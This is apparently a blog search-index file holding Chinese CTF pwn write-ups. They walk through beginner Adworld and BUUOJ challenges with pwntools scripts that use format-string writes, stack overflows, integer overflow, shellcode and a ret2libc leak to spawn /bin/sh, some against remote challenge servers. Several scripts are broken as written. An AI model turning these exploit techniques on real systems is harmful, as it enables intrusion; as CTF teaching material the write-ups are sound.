<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>BUUOJ_Writeup</title>
    <link href="/2021-07/pwn-BUUOJ-writeup/"/>
    <url>/2021-07/pwn-BUUOJ-writeup/</url>
    
    <content type="html"><![CDATA[<h2 id="1-前六道题小结-有点懒直接总结"><a href="#1-前六道题小结-有点懒直接总结" class="headerlink" title="1.前六道题小结:(有点懒直接总结)"></a>1.前六道题小结:(有点懒直接总结)</h2><ul><li>第一题测试nc命令</li><li>pwn1_sctf_2016: 一堆std::string啥的操作<strong>根本没看懂是什么</strong>.</li><li>ciscn_n_1: 栈溢出覆盖浮点数过if语句, 直接到IDA View查看十六进制的数值就可以了</li><li>剩下的几题太简单了(回头来看的题都是这么简单!)</li></ul><h2 id="2-ciscn-2019-c-1"><a href="#2-ciscn-2019-c-1" class="headerlink" title="2. ciscn_2019_c_1"></a>2. ciscn_2019_c_1</h2><ul><li>由于没有给出libc库以及libc库的版本, 所以git clone python的LibcSearcher库, 并且学习如何使用.</li></ul>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn: 攻防世界新手区pwn题解</title>
    <link href="/2021-07/pwn-ctf-pwn2/"/>
    <url>/2021-07/pwn-ctf-pwn2/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn-攻防世界新手区pwn题解"><a href="#pwn-攻防世界新手区pwn题解" class="headerlink" title="pwn: 攻防世界新手区pwn题解"></a>pwn: 攻防世界新手区pwn题解</h1><p>Adworld的新手区水题记录。</p><h2 id="1-get-shell"><a href="#1-get-shell" class="headerlink" title="1 get shell"></a>1 get shell</h2><p>没什么好说的。直接remote或者nc连上去就可以了。</p><h2 id="2-CGfsb"><a href="#2-CGfsb" class="headerlink" title="2 CGfsb"></a>2 CGfsb</h2><h3 id="2-1-checksec"><a href="#2-1-checksec" class="headerlink" title="2.1 checksec"></a>2.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/NLtTXI1s2VZxOgY.png" alt="1"></p><h3 id="2-2-找漏洞"><a href="#2-2-找漏洞" class="headerlink" title="2.2 找漏洞"></a>2.2 找漏洞</h3><p>IDA打开main函数。</p><p><img src="https://i.loli.net/2021/07/19/gftCLErnSAbqV7N.png" alt="2"></p><p>可以看出<code>printf(&amp;s);</code>是明显的格式化字符串漏洞。</p><p>IDA mov 从右往左.</p><p>pwnme的地址：0x804A068<img src="https://i.loli.net/2021/07/19/B41GJedNSzW7x2c.png" alt="image-20210716120017221" style="zoom:67%;" /> <strong>看清楚, 压入的是format字符串的地址!!</strong>.</p><p><img src="https://i.loli.net/2021/07/19/ylWdNF7t21mcRsY.png" alt="3"></p><h3 id="2-3-脚本"><a href="#2-3-脚本" class="headerlink" title="2.3 脚本"></a>2.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#CGfsb.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = p32(<span class="hljs-number">0x804A068</span>) + <span class="hljs-string">&#x27;AAAA%10$n&#x27;</span><br><span class="hljs-comment">#payload = &#x27;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&#x27;</span><br>r = process(<span class="hljs-string">&#x27;./CGfsb&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:\n&#x27;</span>,<span class="hljs-string">&#x27;name&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;please:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="3-when-did-you-born"><a href="#3-when-did-you-born" class="headerlink" title="3 when did you born"></a>3 when did you born</h2><h3 id="3-1-checksec"><a href="#3-1-checksec" class="headerlink" title="3.1 checksec"></a>3.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/m75TCOwzUhu4naY.png" alt="4"></p><h3 id="3-2-找漏洞"><a href="#3-2-找漏洞" class="headerlink" title="3.2 找漏洞"></a>3.2 找漏洞</h3><p>IDA64打开。</p><img src="https://i.loli.net/2021/07/19/kiDx1ElBSs3a9QP.png" alt="5" style="zoom: 77%;" /><p>很明显，第一个输入的数字不能是1926（Excited!)</p><p>然后通过gets把他变成1926（Naive!）</p><h3 id="3-3-脚本"><a href="#3-3-脚本" class="headerlink" title="3.3 脚本"></a>3.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#when_did_you_born.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;AAAAAAAA&#x27;</span> + p32(<span class="hljs-number">1926</span>)<br>r = process(<span class="hljs-string">&#x27;./when_did_you_born&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Birth?\n&#x27;</span>,<span class="hljs-string">&#x27;1925&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Name?\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="4-hello-pwn"><a href="#4-hello-pwn" class="headerlink" title="4 hello pwn"></a>4 hello pwn</h2><h3 id="4-1-checksec"><a href="#4-1-checksec" class="headerlink" title="4.1 checksec"></a>4.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/xyLCbiM2sQ6OqnZ.png" alt="6"></p><h3 id="4-2-找漏洞"><a href="#4-2-找漏洞" class="headerlink" title="4.2 找漏洞"></a>4.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/F1EKL38tD4lCkjm.png" alt="7"></p><p>逻辑很简单，在<code>unk_601068</code>读入一个值，让<code>dword_60106c</code>变为<code>1853186401</code>即可。</p><h3 id="4-3-脚本"><a href="#4-3-脚本" class="headerlink" title="4.3 脚本"></a>4.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#hello_pen.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;AAAA&#x27;</span> + p32(<span class="hljs-number">1853186401</span>)<span class="hljs-comment">#-&gt;转换成16进制就是八位数了, 可以p32</span><br><br>r = process(<span class="hljs-string">&#x27;./hello_pwn&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;bof\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="5-level0"><a href="#5-level0" class="headerlink" title="5 level0"></a>5 level0</h2><h3 id="5-1-checksec"><a href="#5-1-checksec" class="headerlink" title="5.1 checksec"></a>5.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/Fiunr2gLte3zOqa.png" alt="8"></p><h3 id="5-2-找漏洞"><a href="#5-2-找漏洞" class="headerlink" title="5.2 找漏洞"></a>5.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/ZqmXBSlNDhP9MVu.png" alt="9" style="zoom:67%;" /><p>这里好像有个什么东西嘛…</p><h3 id="5-3-脚本"><a href="#5-3-脚本" class="headerlink" title="5.3 脚本"></a>5.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#level0.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x88</span> + p64(<span class="hljs-number">0x400596</span>)<span class="hljs-comment">#callsystem的地址, 简单的read栈溢出</span><br><span class="hljs-comment">#r = process(&#x27;./level0&#x27;)</span><br>r = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">45579</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;World\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="6-level2"><a href="#6-level2" class="headerlink" title="6 level2"></a>6 level2</h2><h3 id="6-1-checksec"><a href="#6-1-checksec" class="headerlink" title="6.1 checksec"></a>6.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/UkONFSAoqVgPyjB.png" alt="10"></p><h3 id="6-2-找漏洞"><a href="#6-2-找漏洞" class="headerlink" title="6.2 找漏洞"></a>6.2 找漏洞</h3><p>system函数！</p><img src="https://i.loli.net/2021/07/19/YKBlwLMFsot4xNy.png" alt="11" style="zoom:80%;" /><p>/bin/sh!</p><img src="https://i.loli.net/2021/07/19/dvgGrQhzkw87ZBP.png" alt="12" style="zoom:80%;" /><p>溢出地址0x8c，返回地址填plt的system地址，参数填/bin/sh的地址。奥利给！</p><p>ps. 会了才知道为什么洛神会这么简洁…..|ू･ω･` )</p><h3 id="6-3-脚本"><a href="#6-3-脚本" class="headerlink" title="6.3 脚本"></a>6.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x8c</span> + p32(<span class="hljs-number">0x8048320</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>+ p32(<span class="hljs-number">0x804A024</span>) <span class="hljs-comment">#空4字节是system函数的返回地址</span><br><span class="hljs-comment">#r = remote(&#x27;111.198.29.45&#x27;,49960)</span><br>r = process(<span class="hljs-string">&quot;./level2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;Input:\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="7-guess-num"><a href="#7-guess-num" class="headerlink" title="7 guess num"></a>7 guess num</h2><h3 id="7-1-checksec"><a href="#7-1-checksec" class="headerlink" title="7.1 checksec"></a>7.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/uN6HcDVqr28J1ml.png" alt="13"></p><h3 id="7-2-找漏洞"><a href="#7-2-找漏洞" class="headerlink" title="7.2 找漏洞"></a>7.2 找漏洞</h3><p>猜数字，先生成了个随机数，然后猜9次。猜对了给flag。</p><img src="https://i.loli.net/2021/07/19/SNmUETKHkDqcroa.png" alt="14" style="zoom:80%;" /><p>很显然，只要通过get函数把随机种子改成自己想要的就行了。</p><p>先写个脚本看看随机种子是0的情况：</p><img src="https://i.loli.net/2021/07/19/YSh74wOVLI3KpTU.png" alt="15" style="zoom:80%;" /><p>写脚本吧。字符串长度为0x30-0x10=0x20。偏移值后面加个0就行。</p><h3 id="7-3-脚本"><a href="#7-3-脚本" class="headerlink" title="7.3 脚本"></a>7.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>l = [<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>]<br>payload = <span class="hljs-string">&#x27;A&#x27;</span>* <span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0</span>)<br>r = process(<span class="hljs-string">&#x27;./guess_num&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,payload)<br><span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> l:<br>r.sendlineafter(<span class="hljs-string">&#x27;number:&#x27;</span>,<span class="hljs-built_in">str</span>(each))<span class="hljs-comment">#sendlineafter的参数就是字符串</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="8-int-overflow"><a href="#8-int-overflow" class="headerlink" title="8 int overflow"></a>8 int overflow</h2><h3 id="8-1-checksec"><a href="#8-1-checksec" class="headerlink" title="8.1 checksec"></a>8.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/N6oXuSjhaAGOz4x.png" alt="16"></p><h3 id="8-2-找漏洞"><a href="#8-2-找漏洞" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><img src="https://i.loli.net/2021/07/19/xEalQB5bc1ovGXy.png" alt="17" style="zoom:80%;" /><p>先进这个函数。</p><p><img src="https://i.loli.net/2021/07/19/n82u3GmtfbsLcjk.png" alt="18"></p><p>显而易见嘛。(?)</p><p>再进check_passwd()</p><p><img src="https://i.loli.net/2021/07/19/MVbGalDqcB3miJp.png" alt="image-20210716122047227" style="zoom: 80%;" />可以看到__int8, 只有0-255, 而且有要求密码长4-8, 所以可以整数溢出的办法, buf长512也够了</p><h3 id="8-3-脚本"><a href="#8-3-脚本" class="headerlink" title="8.3 脚本"></a>8.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>r = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">50645</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x0804868B</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">232</span><br>r.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;name:\n&quot;</span>, <span class="hljs-string">&quot;f**k&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;passwd:\n&quot;</span>, payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="9-cgpwn2"><a href="#9-cgpwn2" class="headerlink" title="9 cgpwn2"></a>9 cgpwn2</h2><h3 id="9-1-checksec"><a href="#9-1-checksec" class="headerlink" title="9.1 checksec"></a>9.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/dOLQ8A5XaRMDF47.png" alt="20"></p><h3 id="8-2-找漏洞-1"><a href="#8-2-找漏洞-1" class="headerlink" title="8.2 找漏洞"></a>8.2 找漏洞</h3><p><img src="https://i.loli.net/2021/07/19/KJQpnbUuq5aoPOl.png" alt="21"></p><p>溢出点肯定就是gets函数啦。偏移值0x2A。<br>但是我们需要自己构造system函数的参数，只要把name的值改成那个值就行了。</p><h3 id="9-3-脚本"><a href="#9-3-脚本" class="headerlink" title="9.3 脚本"></a>9.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x2A</span>(<span class="hljs-string">&#x27;捏妈的,0x26+0x4能给我算成0x30来?&#x27;</span>) + p32(<span class="hljs-number">0x8048420</span>) + <span class="hljs-string">&#x27;AAAA&#x27;</span>-&gt;sys返回地址<span class="hljs-string">&#x27; + p32(0x804A080)&#x27;</span>name的地址<span class="hljs-string">&#x27;</span><br><span class="hljs-string">r = process(&#x27;</span>./cgpwn2<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>name\n<span class="hljs-string">&#x27;,&#x27;</span>/<span class="hljs-built_in">bin</span>/sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">r.sendlineafter(&#x27;</span>here:\n<span class="hljs-string">&#x27;,payload)</span><br><span class="hljs-string">r.interactive()</span><br></code></pre></td></tr></table></figure><h2 id="10-string"><a href="#10-string" class="headerlink" title="10 string"></a>10 string</h2><h3 id="10-1-checksec"><a href="#10-1-checksec" class="headerlink" title="10.1 checksec"></a>10.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/f6NWvTAL2tYuKkr.png" alt="22"></p><h3 id="10-2-找漏洞"><a href="#10-2-找漏洞" class="headerlink" title="10.2 找漏洞"></a>10.2 找漏洞</h3><p>代码好长啊。</p><img src="https://i.loli.net/2021/07/19/32uH7CzocNe4bKE.png" alt="23" style="zoom:80%;" /><p>看看func1。</p><img src="https://i.loli.net/2021/07/19/JI9wTKFP6li1gZV.png" alt="24" style="zoom: 80%;" /><p>func2。</p><img src="https://i.loli.net/2021/07/19/AscTUzQ9x1KXBR8.png" alt="25" style="zoom:80%;" /><p>没有溢出点。func3。</p><img src="https://i.loli.net/2021/07/19/3DxVSQvWNoB58ea.png" alt="26" style="zoom:80%;" /><p>好啦，溢出点。</p><p><img src="https://i.loli.net/2021/07/19/vAengmcpkH6dqK4.png" alt="27"></p><p>很明显，让a1数组的第0位和第1位相等（就是85和68）。</p><p>后面那个mmap是内存映射，意思就是填入一个机器码使得直接执行。</p><h3 id="10-3-脚本"><a href="#10-3-脚本" class="headerlink" title="10.3 脚本"></a>10.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;%68c%7$n&#x27;</span><span class="hljs-comment"># b&#x27;a&#x27;*85 + &#x27;%7$n&#x27;也是可以的</span><br>r = process(<span class="hljs-string">&#x27;./string&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">&#x27;secret[1] is &#x27;</span>)<br>a = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span>+r.recvline(),base=<span class="hljs-number">16</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;name be:\n&#x27;</span>, <span class="hljs-string">&#x27;user&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;up?:\n&#x27;</span>,<span class="hljs-string">&#x27;east&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;leave(0)?:\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;address&#x27;\n&quot;</span>,<span class="hljs-built_in">str</span>(a))<br>r.sendlineafter(<span class="hljs-string">&#x27;wish is:\n&#x27;</span>,payload)<br>r.sendlineafter(<span class="hljs-string">&#x27;SPELL\n&#x27;</span>,asm(shellcraft.amd64.sh(),arch=<span class="hljs-string">&quot;amd64&quot;</span>))<br><span class="hljs-comment">#当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些代码也就是俗称的shellcode。</span><br><span class="hljs-comment">#获得执行system(“/bin/sh”)汇编代码所对应的机器码： asm(shellcraft.sh()) 。注意要指明arch和os。arch有</span><br><span class="hljs-comment">#i386(x86)和amd64(x64)。攻防世界的题解区有人说这个函数失效，其实是因为他没指明环境。不同环境下的汇编代</span><br><span class="hljs-comment">#码是不同的。</span><br>r.interactive()<br><br><span class="hljs-comment">#AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-</span><br></code></pre></td></tr></table></figure><h2 id="11-level3"><a href="#11-level3" class="headerlink" title="11 level3"></a>11 level3</h2><h3 id="11-1-checksec"><a href="#11-1-checksec" class="headerlink" title="11.1 checksec"></a>11.1 checksec</h3><p><img src="https://i.loli.net/2021/07/19/kwIAFZPTb5BuMfV.png" alt="28"></p><h3 id="11-2-找漏洞"><a href="#11-2-找漏洞" class="headerlink" title="11.2 找漏洞"></a>11.2 找漏洞</h3><p>开IDA看看，看到有一个read的栈溢出。</p><p><img src="https://i.loli.net/2021/07/19/4SCUlP8QLGINi7k.png" alt="29"></p><p>只有write和read函数，那只能通过泄露libc的基址来调用<code>system(&#39;/bin/sh&#39;)</code>了。</p><p>我们可以知道的有：write函数的plt表位置和got表位置。由于在read函数之前已经调用过write函数了，即已经完成了延迟绑定，那么got表中已经记录了write的地址，由于libc的函数偏移值是固定的，则可以获得libc的基址，并得到system函数的实际地址。</p><h3 id="11-3-脚本"><a href="#11-3-脚本" class="headerlink" title="11.3 脚本"></a>11.3 脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>aaaa<br><br>context(os=<span class="hljs-string">&quot;linux&quot;</span>, arch=<span class="hljs-string">&quot;amd64&quot;</span>, log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><br>DEBUG = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">if</span> DEBUG == <span class="hljs-number">1</span>:<br>p = process(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>,<span class="hljs-number">56008</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(write_plt)  + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#从这里跳转到write函数中,默认当前栈顶就是返回地址,下面的依次是参数1-n(先压参数再返回地址)</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>p.sendline(payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<span class="hljs-comment">#unpack() 这里是write函数输出的got</span><br><br><span class="hljs-comment">#print(hex(write_addr))</span><br>p.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<span class="hljs-comment">#重新进入main函数</span><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr = (write_addr - write_libc)<span class="hljs-string">&#x27;&#x27;&#x27;这玩意儿是基址&#x27;&#x27;&#x27;</span> + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = (write_addr - write_libc) + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x8c</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr) <br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = remote(<span class="hljs-string">&#x27;111.200.241.244&#x27;</span>, <span class="hljs-number">63933</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./level3&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc_32.so.6&#x27;</span>)<br><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>write_libc = libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr = write_addr - write_libc + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>sh_addr = write_addr - write_libc + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">0x4</span>) + p32(sys_addr) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + sh_addr<br>p.sendlineafter(<span class="hljs-string">&#x27;:\n&#x27;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwn题:格式化输出字符串漏洞</title>
    <link href="/2021-07/pwn-ctf-pwn1/"/>
    <url>/2021-07/pwn-ctf-pwn1/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn：格式化字符串漏洞"><a href="#pwn：格式化字符串漏洞" class="headerlink" title="pwn：格式化字符串漏洞"></a>pwn：格式化字符串漏洞</h1><p>CTF——PWN的基础漏洞类型。</p><h2 id="1-printf函数的格式化字符串漏洞"><a href="#1-printf函数的格式化字符串漏洞" class="headerlink" title="1 printf函数的格式化字符串漏洞"></a>1 printf函数的格式化字符串漏洞</h2><h3 id="1-1-printf函数"><a href="#1-1-printf函数" class="headerlink" title="1.1 printf函数"></a>1.1 printf函数</h3><p>printf()函数是格式化输出函数, 一般用于向准则输出设备按规定式样输出消息。<br>函数的原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *format, ...)</span></span>;<br></code></pre></td></tr></table></figure><p>printf()函数的调用格式为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span 